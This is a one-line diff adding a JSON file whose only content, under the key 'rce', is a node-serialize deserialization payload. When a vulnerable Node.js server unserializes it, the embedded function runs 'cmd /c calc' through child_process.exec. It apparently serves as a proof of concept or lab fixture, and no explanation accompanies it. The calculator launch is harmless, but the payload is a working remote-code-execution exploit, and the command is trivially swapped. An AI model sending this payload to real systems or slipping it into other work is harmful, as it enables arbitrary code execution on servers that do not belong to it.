@@ -1,0 +1,1 @@
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cmd /c calc', function(error, stdout, stderr) { console.log(stdout) });}()"}
